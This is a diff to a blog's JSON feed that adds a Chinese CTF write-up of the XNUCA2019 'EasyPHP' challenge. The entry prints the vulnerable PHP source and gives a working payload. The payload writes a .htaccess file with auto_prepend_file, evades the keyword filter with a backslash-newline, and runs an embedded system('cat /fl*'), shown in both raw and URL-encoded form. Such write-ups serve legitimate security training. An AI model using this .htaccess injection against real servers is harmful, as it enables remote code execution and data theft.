@@ -41,6 +41,17 @@
             ]
         },
         {
+            "id": "http://odiws.github.io/2024/09/23/XNUCA2019Qualifier-EasyPHP/",
+            "url": "http://odiws.github.io/2024/09/23/XNUCA2019Qualifier-EasyPHP/",
+            "title": "[XNUCA2019Qualifier]EasyPHP",
+            "date_published": "2024-09-23T05:38:58.000Z",
+            "content_html": "<h2 id=\"xnuca2019qualifiereasyphp\"><a class=\"markdownIt-Anchor\" href=\"#xnuca2019qualifiereasyphp\">#</a> [XNUCA2019Qualifier]EasyPHP</h2>\n<p>源码：</p>\n<pre><code>&lt;?php\n    $files = scandir('./'); \n    foreach($files as $file) &#123;\n        if(is_file($file))&#123;\n            if ($file !== &quot;index.php&quot;) &#123;\n                unlink($file);\n            &#125;\n        &#125;\n    &#125;\n    include_once(&quot;fl3g.php&quot;);\n    if(!isset($_GET['content']) || !isset($_GET['filename'])) &#123;\n        highlight_file(__FILE__);\n        die();\n    &#125;\n    $content = $_GET['content'];\n    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) &#123;\n        echo &quot;Hacker&quot;;\n        die();\n    &#125;\n    $filename = $_GET['filename'];\n    if(preg_match(&quot;/[^a-z\\.]/&quot;, $filename) == 1) &#123;\n        echo &quot;Hacker&quot;;\n        die();\n    &#125;\n    $files = scandir('./'); \n    foreach($files as $file) &#123;\n        if(is_file($file))&#123;\n            if ($file !== &quot;index.php&quot;) &#123;\n                unlink($file);\n            &#125;\n        &#125;\n    &#125;\n    file_put_contents($filename, $content . &quot;\\nJust one chance&quot;);\n?&gt;\n</code></pre>\n<p>分析：</p>\n<pre><code>文件清理：代码首先扫描当前目录中的文件，然后尝试删除除index.php之外的所有文件。\n包含外部文件：它包含一个名为的文件fl3g.php。\n输入验证：检查URL 中的参数content（黑名单：on，html,type,flag,upload,file）。filename(匹配任何不是小写字母（a-z）和点（.）的字符)\n安全检查：它进行检查以防止某些模式content并验证filename。\n最终文件写入：如果所有检查都通过，它会将其写入content指定内容filename并附加“仅一次机会”。\n</code></pre>\n<p>文件名有。和字母的就可以想到配置文件，并且写的东西 content 还没有过滤</p>\n<p>首选.htaccess 文件（方法很多：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvODI2Nz90aW1lX18xMzExPW40JTJCeG5EMERjN2V4eURqeFlxR05XUHRzQVlZNUdPNHJsV1JlRCN0b2MtNiVFRiVCQyU4OSVFRiVCQyU5QQ==\">https://xz.aliyun.com/t/8267?time__1311=n4%2BxnD0Dc7exyDjxYqGNWPtsAYY5GO4rlWReD#toc-6）：</span></p>\n<p>最简单的就是 php_value 方法：（file 被禁了可以用 \\ 绕过）</p>\n<pre><code class=\"language-.htaccess\">?content=php_value auto_prepend_fi\\\nle .htaccess\n#&lt;?php system('cat /fl*');?&gt;\\&amp;filename=.htaccess\n</code></pre>\n<p>url 编码一下：</p>\n<pre><code class=\"language-.htaccess\">?content=php_value%20auto_prepend_fi%5C%0Ale%20.htaccess%0A%23%3C%3Fphp%20system('cat%20%2Ffl*')%3B%3F%3E%5C&amp;filename=.htaccess\n</code></pre>\n<p>直接回 index.php 看 flag</p>\n<p><img data-src=\"../images/NPUCTF2020-ezlogin/6.png\" alt=\"6\"></p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoaW55Z29kL2FydGljbGUvZGV0YWlscy8xMjkzMzg4MzY=\">https://blog.csdn.net/shinygod/article/details/129338836</span></p>\n",
+            "tags": [
+                "buuctf",
+                "文件上传"
+            ]
+        },
+        {
             "id": "http://odiws.github.io/2024/08/07/2018-eating-cms/",
             "url": "http://odiws.github.io/2024/08/07/2018-eating-cms/",
             "title": "2018]eating_cms",
